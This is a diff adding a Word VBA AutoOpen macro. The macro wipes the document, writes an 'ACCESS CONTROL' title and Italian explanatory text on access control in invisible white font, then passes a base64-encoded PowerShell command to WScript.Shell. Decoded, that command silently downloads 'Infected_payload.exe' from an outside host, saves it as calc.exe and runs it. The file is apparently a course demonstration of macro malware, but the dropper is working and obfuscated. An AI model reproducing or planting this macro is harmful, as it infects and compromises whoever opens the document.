@@ -1,0 +1,49 @@
+Sub AutoOpen()
+    ' Elimina il contenuto del documento
+    ActiveDocument.Content.Delete
+    
+    ' Inserisce il titolo del documento
+    With ActiveDocument.Content
+        .InsertBefore "ACCESS CONTROL"
+        .ParagraphFormat.Alignment = wdAlignParagraphCenter
+        .Font.Name = "Arial"
+        .Font.Size = 24
+        .Font.Bold = True
+        .Font.Color = RGB(255, 0, 0) ' Rosso
+        .InsertParagraphAfter
+    End With
+    
+    ' Inserisce il primo paragrafo con il testo richiesto
+    With ActiveDocument.Content
+        .InsertAfter "L’Access Control è uno dei principali meccanismi di protezione (insieme all’autenticazione) per proteggere un’organizzazione da tutte le tipologie di attacco viste fino a questo momento. In particolare, con i meccanismi di controllo degli accessi, andiamo a garantire la confidenzialità delle informazioni (dell’organizzazione) e dei sistemi che processano tali informazioni. Sorge a questo punto spontanea la domanda: Che cosa fa un sistema di controllo degli accessi?"
+        .InsertParagraphAfter
+    End With
+    
+    ' Imposta il colore del testo del primo paragrafo
+    ActiveDocument.Paragraphs(2).Range.Font.Color = RGB(255, 255, 255) ' Bianco
+    
+    ' Imposta la dimensione del carattere del primo paragrafo
+    ActiveDocument.Paragraphs(2).Range.Font.Size = 12 ' Dimensione del carattere in pt
+    
+    ' Inserisce il secondo paragrafo con il testo fornito
+    With ActiveDocument.Content
+        .InsertAfter "Un sistema di controllo degli accessi va a garantire, che le risorse di un’organizzazione (quali ad esempio: file, firewall, applicazioni Web e servizi Cloud) non vengano accedute da utenti non autorizzati e allo stesso tempo, garantisce anche che utenti autorizzati non abusino dei loro privilegi per compiere delle azioni malevole ai danni dell’organizzazione"
+        .InsertParagraphAfter
+    End With
+    
+    ' Imposta il colore del testo del secondo paragrafo
+    ActiveDocument.Paragraphs(3).Range.Font.Color = RGB(255, 255, 255) ' Bianco
+    
+    ' Imposta la dimensione del carattere del secondo paragrafo
+    ActiveDocument.Paragraphs(3).Range.Font.Size = 12 ' Dimensione del carattere in pt
+
+    ' Aggiunge il codice aggiuntivo qui
+    ' Ad esempio:
+    Dim malicious_instruction As String
+    malicious_instruction = "powershell.exe -encodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBlAHgAZQAgAC0AVwBpAG4AZABvAHcAUwB0AHkAbABlACAAaABpAGQAZABlAG4AIAAtAEEAcgBnAHUAbQBlAG4AdABMAGkAcwB0ACAAIgBJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAnAGgAdAB0AHAAOgAvAC8AdgB1AGwAbgAuAGQAbwBtAGEAaQBuAC8AQwB5AGIAZQByAHMAZQBjAHUAcgBpAHQAeQAvAEkAbgBmAGUAYwB0AGUAZABfAHAAYQB5AGwAbwBhAGQALgBlAHgAZQAnACAALQBPAHUAdABGAGkAbABlACAAQwA6AFwAVQBzAGUAcgBzAFwAbQBhAGwAdwBhAHIAZQBcAGMAYQBsAGMALgBlAHgAZQAiACAALQBXAGEAaQB0ADsAIABTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAIABoAGkAZABkAGUAbgAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIAAiAEMAOgBcAFUAcwBlAHIAcwBcAG0AYQBsAHcAYQByAGUAXABjAGEAbABjAC4AZQB4AGUAIgA="
+    Set WsShell = CreateObject("WScript.Shell")
+    WsShell.Run (malicious_instruction)
+End Sub
+
+
+
